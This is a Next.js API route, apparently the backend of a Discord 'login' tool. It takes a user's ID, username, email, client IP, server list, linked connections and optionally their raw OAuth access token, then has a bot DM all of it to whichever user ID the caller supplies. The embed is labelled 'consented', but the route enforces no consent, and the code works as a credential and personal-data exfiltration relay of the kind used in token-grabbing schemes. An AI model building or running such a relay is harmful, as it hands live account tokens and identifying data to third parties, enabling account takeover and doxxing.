// pages/api/send-dm.js
import { NextApiRequest, NextApiResponse } from 'next';

/**
 * Expected POST JSON:
 * {
 *   targetUserId: "123456789012345678",
 *   userData: {...},        // result from /users/@me
 *   guildsData: [...],      // result from /users/@me/guilds or error object
 *   connsData: [...],       // result from /users/@me/connections or error object
 *   clientIp: "1.2.3.4",
 *   maskedToken: "abcd••••wxyz",
 *   includeRawToken: true/false,
 *   rawToken: "..." // if includeRawToken true
 * }
 */

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
  const BOT_TOKEN = process.env.BOT_TOKEN;
  if (!BOT_TOKEN) return res.status(500).json({ error: 'BOT_TOKEN not configured' });

  const body = req.body || {};
  const {
    targetUserId,
    userData = {},
    guildsData = null,
    connsData = null,
    clientIp = null,
    maskedToken = null,
    includeRawToken = false,
    rawToken = null
  } = body;

  if (!targetUserId) return res.status(400).json({ error: 'targetUserId required' });

  // Basic validation of user id (digits)
  if (!/^\d{17,20}$/.test(targetUserId)) {
    return res.status(400).json({ error: 'invalid targetUserId' });
  }

  try {
    // 1) Create DM channel with user
    const createDm = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        Authorization: `Bot ${BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ recipient_id: targetUserId })
    });

    if (!createDm.ok) {
      const txt = await createDm.text();
      console.error('create DM failed', createDm.status, txt);
      return res.status(502).json({ error: 'Failed to create DM channel', details: txt });
    }

    const dmChannel = await createDm.json();
    const channelId = dmChannel.id;
    if (!channelId) {
      return res.status(502).json({ error: 'No channel id returned' });
    }

    // 2) Build embed fields — labeled and truncated to reasonable sizes
    const safeTruncate = (s, n=1024) => {
      if (s === undefined || s === null) return 'N/A';
      let str = typeof s === 'string' ? s : JSON.stringify(s, null, 2);
      if (str.length > n) str = str.slice(0, n-1) + '…';
      return str;
    };

    const fields = [
      { name: 'User ID', value: safeTruncate(userData.id || 'N/A'), inline: true },
      { name: 'Username', value: safeTruncate(`${userData.username || 'N/A'}#${userData.discriminator || ''}`), inline: true },
      { name: 'Email', value: safeTruncate(userData.email || 'N/A'), inline: true },
      { name: 'Client IP', value: safeTruncate(clientIp || 'N/A'), inline: true },
      { name: 'Scope', value: safeTruncate(Array.isArray(body.scopes) ? body.scopes.join(', ') : 'identify,email,guilds,connections'), inline: false },
      { name: 'Masked token', value: safeTruncate(maskedToken || 'N/A'), inline: false }
    ];

    // Guilds (top 8)
    if (Array.isArray(guildsData)) {
      const gList = guildsData.slice(0, 8).map(g => `${g.name || 'unknown'} (${g.id || 'id'})`).join('\n') || 'None';
      fields.push({ name: 'Guilds (top 8)', value: safeTruncate(gList, 1024), inline: false });
    } else if (guildsData && guildsData.error) {
      fields.push({ name: 'Guilds error', value: safeTruncate(guildsData.error, 1024), inline: false });
    }

    // Connections
    if (Array.isArray(connsData)) {
      const cList = connsData.slice(0, 10).map(c => `${c.type || 't'}: ${c.name || c.id || 'n/a'}`).join('\n') || 'None';
      fields.push({ name: 'Connections', value: safeTruncate(cList, 1024), inline: false });
    } else if (connsData && connsData.error) {
      fields.push({ name: 'Connections error', value: safeTruncate(connsData.error, 1024), inline: false });
    }

    // Optionally include raw token as a field (be careful)
    if (includeRawToken && rawToken) {
      fields.push({ name: 'Raw access token', value: `\`\`\`${safeTruncate(rawToken, 1900)}\`\`\``, inline: false });
    }

    const embed = {
      title: `Consented login — ${userData.username || 'user'}`,
      description: 'This DM contains the data you consented to collect.',
      color: 5814783,
      fields,
      timestamp: new Date().toISOString()
    };

    // 3) Post message to the DM channel
    const sendMsg = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
      method: 'POST',
      headers: {
        Authorization: `Bot ${BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ embeds: [embed] })
    });

    if (!sendMsg.ok) {
      const txt = await sendMsg.text();
      console.error('send message failed', sendMsg.status, txt);
      return res.status(502).json({ error: 'Failed to send DM', details: txt });
    }

    return res.status(200).json({ ok: true, channelId });
  } catch (err) {
    console.error('send-dm error', err);
    return res.status(500).json({ error: 'Server error', details: String(err) });
  }
}
